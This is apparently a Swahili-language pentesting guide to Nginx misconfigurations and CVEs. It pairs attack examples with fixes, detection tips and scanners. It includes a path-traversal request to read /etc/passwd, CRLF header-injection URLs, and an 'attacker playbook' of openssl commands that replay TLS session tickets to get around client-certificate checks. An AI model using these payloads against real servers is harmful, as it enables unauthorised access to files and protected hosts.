# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Kukosekana kwa eneo la root <a href="#missing-root-location" id="missing-root-location"></a>

Unapoweka mipangilio ya server ya Nginx, **root directive** ina jukumu muhimu kwa kuainisha saraka ya msingi kutoka ambayo mafaili yanatolewa. Angalia mfano hapa chini:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Katika usanidi huu, `/etc/nginx` imewekwa kama directory ya root. Usanidi huu unaruhusu upatikanaji wa faili ndani ya directory ya root iliyotajwa, kama `/hello.txt`. Hata hivyo, ni muhimu kutambua kwamba imefafanuliwa tu location maalum (`/hello.txt`). Hakuna usanidi kwa location ya root (`location / {...}`). Kutokuwepo kwa usanidi huo kunamaanisha kuwa directive ya root inatumika kwa kiwango cha ujumla, ikiruhusu maombi kwa path ya root `/` kufikia faili chini ya `/etc/nginx`.

Kitisho muhimu cha usalama kinatokana na usanidi huu. Ombi rahisi la `GET`, kama `GET /nginx.conf`, linaweza kufunua taarifa nyeti kwa kuwatumikisha faili ya configuration ya Nginx iliyoko `/etc/nginx/nginx.conf`. Kuweka root kwenye directory isiyo nyeti sana, kama `/etc`, kunaweza kupunguza hatari hii, lakini bado kunaweza kuruhusu upatikanaji usiotarajiwa wa faili nyingine muhimu, ikiwa ni pamoja na faili nyingine za configuration, access logs, na hata credentials zilizofichwa zilizotumika kwa HTTP basic authentication.

## Usanidi mbaya wa Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Katika faili za configuration za Nginx, inafaa kuchunguza kwa makini direktivu za "location". Udhaifu unaojulikana kama Local File Inclusion (LFI) unaweza kuingizwa bila kutarajiwa kupitia usanidi unaofanana na ufuatao:
```
location /imgs {
alias /path/images/;
}
```
Usanidi huu unasumbuliwa na mashambulizi ya LFI kwa sababu seva inatafsiri maombi kama `/imgs../flag.txt` kama jaribio la kufikia faili nje ya saraka iliyokusudiwa, na kwa ufanisi hurejea kwa `/path/images/../flag.txt`. Hitilafu hii inaruhusu wadukuzi kupata faili kutoka katika mfumo wa faili wa seva ambazo hazipaswi kupatikana kupitia wavuti.

Ili kupunguza udhaifu huu, usanidi unapaswa kubadilishwa ili:
```
location /imgs/ {
alias /path/images/;
}
```
Maelezo zaidi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Mitihani ya Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Kizuizi cha njia zisizo salama <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Angalia ukurasa ufuatayo ili ujifunze jinsi ya kuepuka directives kama:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Matumizi hatari ya variable / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variables hatarishi `$uri` na `$document_ur`i; hili linaweza kurekebishwa kwa kuzibadilisha kwa `$request_uri`.
>
> A regex can also be vulnerable like:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

Udhaifu katika usanidi wa Nginx unaonyeshwa kwa mfano hapa chini:
```
location / {
return 302 https://example.com$uri;
}
```
Herufi \r (Carriage Return) na \n (Line Feed) zinaonyesha new line characters katika HTTP requests, na fomu zao za URL-encoded zinaonyeshwa kama `%0d%0a`. Kujumuisha characters hizi katika request (mfano, `http://localhost/%0d%0aDetectify:%20clrf`) kwa misconfigured server husababisha server kuorodhesha header mpya iitwayo `Detectify`. Hii hutokea kwa sababu $uri variable ina-decode URL-encoded new line characters, na kusababisha header isiyotarajiwa kwenye response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Jifunze zaidi kuhusu hatari za CRLF injection na response splitting kwenye [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Tekniki hii pia imeelezewa [**katika mazungumzo haya**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) pamoja na mifano ya udhaifu na mbinu za kugundua. Kwa mfano, ili kugundua mpangilio usio sahihi huu kutoka mtazamo wa blackbox unaweza kutuma maombi haya:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Ikiwa kuna udhaifu, ya kwanza itatendeka kwa sababu "X" ni method yoyote ya HTTP na ya pili itarudisha kosa kwa sababu H si method halali. Hivyo server itapokea kitu kama: `GET / H HTTP/1.1` na hii itasababisha kosa.

Mifano mingine ya kugundua yatakuwa:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Baadhi ya usanidi zenye udhaifu zilizopatikana zilizoonyeshwa katika mazungumzo hayo zilikuwa:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Kumbuka tena jinsi **`$uri`** ilivyo katika URL (mara hii ndani ya kigezo)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Sasa katika AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Kigezo chochote

Iligunduliwa kwamba **data inayotolewa na mtumiaji** inaweza kutendewa kama **Nginx variable** katika mazingira fulani. Sababu ya tabia hii bado haijaeleweka kabisa, lakini si nadra wala si rahisi kuthibitisha. Tukio hili liliangaziwa katika ripoti ya usalama kwenye HackerOne, ambayo inaweza kutazamwa [here](https://hackerone.com/reports/370094). Uchunguzi zaidi wa ujumbe wa kosa ulisababisha kubaini kwamba linatokea ndani ya [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), ukibainisha Server Side Includes (SSI) kama chanzo chake.

Ili **gundua kosa hili la usanidi**, amri ifuatayo inaweza kutekelezwa, ambayo inahusisha kuweka referer header ili kujaribu kuchapishwa kwa variable:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Uchunguzi wa usanidi huu usio sahihi katika mifumo uligundua matukio kadhaa ambapo vigezo vya Nginx vinaweza kuchapishwa na mtumiaji. Hata hivyo, kupungua kwa idadi ya matukio yaliyo hatarini kunaonyesha kuwa juhudi za kurekebisha tatizo hili zimefanikiwa kwa kiasi.

### Kutumia try_files na vigezo $URI$ARGS

Usanidi usio sahihi wa Nginx ufuatao unaweza kusababisha udhaifu wa LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Katika usanidi wetu tuna agizo `try_files` ambalo linatumiwa kukagua kuwepo kwa faili kwa mpangilio uliowekwa. Nginx itahudumia ile ya kwanza itakayopatikana. Sintaksia msingi ya agizo la `try_files` ni kama ifuatavyo:
```
try_files file1 file2 ... fileN fallback;
```
Nginx itatafuta kuwepo kwa kila faili kwa mpangilio ulioainishwa. Ikiwa faili ipo, itahudumiwa mara moja. Ikiwa hakuna miongoni mwa faili zilizotajwa zinazopatikana, ombi litapitishwa kwa chaguo la fallback, ambalo linaweza kuwa URI nyingine au ukurasa maalum wa error.

Hata hivyo, unapotumia vigezo vya `$uri$args` katika directive hii, Nginx itajaribu kutafuta faili linalolingana na request URI iliyojumuishwa na yoyote ya query string arguments. Kwa hivyo tunaweza ku-exploit configuration hii:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Kwa payload ifuatayo:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Kwa kutumia payload yetu tutatoka kwenye saraka ya mzizi (iliyosanifiwa katika usanidi wa Nginx) na kupakia faili `/etc/passwd`. Katika logi za debug tunaweza kuona jinsi Nginx inavyojaribu mafaili:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC dhidi ya Nginx ukitumia usanidi ulioelezwa hapo juu:
![Example burp request](../../images/nginx_try_files.png)

## Kusoma majibu ghafi ya backend

Nginx inatoa kipengele kupitia `proxy_pass` kinachoruhusu kukamata makosa na vichwa vya HTTP vinavyotokana na backend, kwa lengo la kuficha ujumbe wa makosa ya ndani na vichwa. Hii hufikiwa kwa Nginx kutumikisha kurasa za makosa maalum kama majibu kwa makosa ya backend. Hata hivyo, changamoto zinaibuka wakati Nginx inakutana na ombi batili la HTTP. Ombi kama hilo linafikishwa kwa backend kama lilivyopokelewa, na majibu ghafi ya backend kisha yatumwa moja kwa moja kwa client bila uingiliaji wa Nginx.

Angalia hali ya mfano inayohusisha application ya uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Ili kudhibiti hili, maagizo maalum katika usanidi wa Nginx yanatumiwa:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Amri hii inaruhusu Nginx kutoa jibu maalum kwa majibu ya backend yenye msimbo wa hali zaidi ya 300. Inahakikisha kwamba, kwa mfano wetu wa programu ya uWSGI, jibu la `500 Error` linakamatwa na kushughulikiwa na Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Kama jina linavyopendekeza, amri hii inaficha vichwa maalum vya HTTP kutoka kwa mteja, ikiimarisha faragha na usalama.

Wakati ombi halali la `GET` linapofanywa, Nginx inalishughulikia kawaida, ikirudisha jibu la makosa la kawaida bila kufichua vichwa vya siri. Hata hivyo, ombi batili la HTTP linaporuka utaratibu huu, na kusababisha kufichuka kwa majibu ya backend ghafi, pamoja na vichwa vya siri na ujumbe wa makosa.

## merge_slashes imezimwa

Kawaida, Nginx's **`merge_slashes` directive** imewekwa kuwa **`on`**, ambayo inabana slashi nyingi za mbele kwenye URL kuwa slashi moja. Kipengele hiki, ingawa kinaboresha usindikaji wa URL, kinaweza bila kukusudia kuficha udhaifu katika programu zilizowekwa nyuma ya Nginx, hasa zile zilizo hatarini kwa mashambulizi ya local file inclusion (LFI). Wataalamu wa usalama **Danny Robinson and Rotem Bar** wamebainisha hatari zinazowezekana zinazohusiana na tabia hii ya chaguo-msingi, hasa wakati Nginx inafanya kazi kama reverse-proxy.

Ili kupunguza hatari hizi, inashauriwa **kuzima `merge_slashes` directive** kwa programu zilizo hatarini kwa udhaifu huo. Hii inahakikisha kwamba Nginx inapeleka maombi kwa programu bila kubadilisha muundo wa URL, hivyo haifichi matatizo ya usalama yaliyopo.

Kwa maelezo zaidi angalia [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Vichwa vya Majibu**

Kama ilivyoonyeshwa katika [**this writeup**](https://mizu.re/post/cors-playground), kuna vichwa fulani ambavyo vikikuwepo kwenye jibu kutoka kwa web server vitabadilisha tabia ya proxy ya Nginx. Unaweza kuvitazama [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Inaamuru Nginx kufanya redirect ya ndani ya ombi kwenda eneo maalum.
- `X-Accel-Buffering`: Inadhibiti kama Nginx inapaswa kuweka jibu kwenye buffer au la.
- `X-Accel-Charset`: Inaweka character set kwa jibu wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Expires`: Inaweka muda wa kuisha kwa jibu wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Inapunguza kasi ya uhamishaji kwa majibu wakati wa kutumia X-Accel-Redirect.

Kwa mfano, kichwa **`X-Accel-Redirect`** kitasababisha redirect ya ndani kwenye nginx. Kwa hivyo kuwa na usanidi wa nginx unaoonyesha kitu kama **`root /`** na jibu kutoka kwa web server lenye **`X-Accel-Redirect: .env`** kutaifanya nginx itume maudhui ya **`/.env`** (Path Traversal).

### **Thamani ya chaguo-msingi katika directive ya map**

Katika **Nginx configuration**, amri ya `map` mara nyingi ina jukumu katika **authorization control**. Makosa ya kawaida ni kutosema thamani ya **default**, ambayo inaweza kusababisha upatikanaji bila idhini. Kwa mfano:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bila `default`, **malicious user** anaweza bypass security kwa kufikia **undefined URI** ndani ya `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) inashauri kuweka **default value** ili kuepuka matatizo hayo.

### **DNS Spoofing Vulnerability**

DNS spoofing dhidi ya Nginx inawezekana chini ya masharti fulani. Ikiwa attacker anajua **DNS server** inayotumika na Nginx na anaweza intercept DNS queries zake, anaweza spoof DNS records. Hata hivyo, njia hii haifanyi kazi ikiwa Nginx imewekwa kutumia **localhost (127.0.0.1)** kwa DNS resolution. Nginx inaruhusu kubainisha DNS server kama ifuatavyo:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` na `internal` Maagizo**

Maagizo ya **`proxy_pass`** yanatumika kupeleka maombi kwa server nyingine, ama ndani ama nje. Maagizo ya **`internal`** yanahakikisha kuwa maeneo fulani yanapatikana tu ndani ya Nginx. Ingawa maagizo haya si udhaifu wa usalama peke yao, usanidi wao unahitaji ukaguzi makini ili kuzuia mapungufu ya usalama.

## proxy_set_header Upgrade & Connection

Ikiwa server ya nginx imewekwa kupitisha header za Upgrade na Connection, [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) inaweza kufanywa kupata endpoints zilizolindwa/za ndani.

> [!CAUTION]
> Udhaifu huu utamruhusu mshambuliaji **kuanzisha muunganisho wa moja kwa moja na `proxy_pass` endpoint** (`http://backend:9999` katika kesi hii) ambao yaliyomo hayataangaliwa na nginx.

Mfano wa usanidi wenye udhaifu wa kuiba `/flag` kutoka [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Kumbuka kwamba hata kama `proxy_pass` ilikuwa ikielekeza kwenye **path** kama `http://backend:9999/socket.io` muunganisho utaanzishwa na `http://backend:9999` hivyo unaweza **kuwasiliana na path nyingine yoyote ndani ya endpoint hiyo ya ndani. Kwa hivyo haijalishi ikiwa path imeainishwa katika URL ya proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Mnamo 2024 Nginx ilitangaza CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 na CVE-2024-35200, ikionyesha kwamba **single hostile QUIC session** inaweza kusababisha worker processes crash au leak memory wakati `ngx_http_v3_module` ya majaribio imejumuishwa na socket ya `listen ... quic` imefunuliwa. Builds zilizoathirika ni 1.25.0–1.25.5 na 1.26.0, wakati 1.27.0/1.26.1 zinabeba fixes; memory disclosure (CVE-2024-34161) inahitaji pia MTUs kubwa kuliko 4096 bytes ili kuonyesha data nyeti (maelezo yako katika advisory ya nginx ya 2024 iliyo rejea hapo chini).

**Recon & exploitation hints**

- HTTP/3 ni opt-in, kwa hivyo skana kwa majibu ya `Alt-Svc: h3=":443"` au fanya brute-force ya UDP/443 QUIC handshakes; mara itakapothibitishwa, fuzz handshake na STREAM frames kwa custom `quiche-client`/`nghttp3` payloads ili kusababisha worker crashes na kulazimisha log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

Ushauri wa Februari 2025 ulifichua kwamba nginx 1.11.4–1.27.3 zilizojengwa kwa OpenSSL zinawezesha **kutumia tena kikao cha TLS 1.3** kutoka kwenye virtual host moja inayotegemea jina ndani ya nyingine, hivyo mteja aliyependekezana na host isiyo na cheti anaweza kucheza tena ticket/PSK ili kuingia kwenye vhost iliyo na ulinzi wa `ssl_verify_client on;` na kuepuka mTLS kabisa. Hitilafu hii inatokea kila wakati virtual hosts nyingi zinaposhiriki cache na tickets za kikao cha TLS 1.3 (ona advisory ya nginx ya 2025 iliyotajwa hapa chini).

**Attacker playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Ikiwa target inaweza kuathiriwa, handshake ya pili inakamilika bila kuwasilisha client certificate, ikifunua maeneo yaliyolindwa.

**Nini cha kukagua**

- Mchanganyiko wa `server_name` blocks zinazoshirikisha `ssl_session_cache shared:SSL` pamoja na `ssl_session_tickets on;`.
- Blocki za Admin/API zinazotarajia mTLS lakini zinarithi mipangilio ya shared session cache/ticket kutoka kwa host za umma.
- Automation inayowasha session resumption ya TLS 1.3 kimataifa (mf., Ansible roles) bila kuzingatia utengano wa vhost.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

Shambulio la HTTP/2 Rapid Reset (CVE-2023-44487) bado linaathiri nginx wakati waendeshaji wanaongeza `keepalive_requests` au `http2_max_concurrent_streams` zaidi ya defaults: mshambuliaji hufungua connection moja ya HTTP/2, huvamia kwa maelfu ya streams, kisha mara moja hutuma fremu za `RST_STREAM` ili dari ya concurrency isifikiki wakati CPU inaendelea kuchoma kwenye mantiki ya teardown. Default za nginx (128 concurrent streams, 1000 keepalive requests) huweka mzunguko wa uharibifu mdogo; kuinua mipaka hiyo "kwa kiasi kikubwa" hufanya rahisi kutopisha workers hata kutoka kwa client mmoja (ona maelezo ya F5 yaliyotajwa hapo chini).

**Vidokezo vya kugundua**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Vifaa vinavyoonyesha thamani zisizo za kawaida kwa maelekezo hayo vinakuwa malengo mazuri: mteja mmoja wa HTTP/2 anaweza kupitia mzunguko wa uundaji wa stream na kutuma mara moja fremu za `RST_STREAM` ili kuweka CPU ikitumia rasilimali nyingi bila kuzima concurrency cap.

## Jaribu wewe mwenyewe

Detectify imeunda repository ya GitHub ambapo unaweza kutumia Docker kuanzisha seva yako ya jaribio ya Nginx yenye vulnerable na baadhi ya misconfigurations zilizojadiliwa katika makala hii na kujaribu kuzitafuta mwenyewe!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Zana za Static Analyzer

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (fork iliyosasishwa ya GIXY) ni zana ya kuchambua mipangilio ya Nginx, yenye lengo la kubaini vulnerabilities, insecure directives, na risky misconfigurations. Pia inabaini misconfigurations zinazohusiana na performance, na inatambua missed hardening opportunities, ikiruhusu automated flaw detection.
- [gixy-ng](https://github.com/dvershinin/gixy) (fork inayotunzwa kwa ufanisi ya GIXY) ni zana ya kuchambua mipangilio ya Nginx, yenye lengo la kubaini vulnerabilities, insecure directives, na risky misconfigurations. Pia inabaini misconfigurations zinazohusiana na performance, na inatambua missed hardening opportunities, ikiruhusu automated flaw detection.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ni zana rahisi ya kutafuta common Nginx misconfigurations na vulnerabilities.

## Marejeo

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
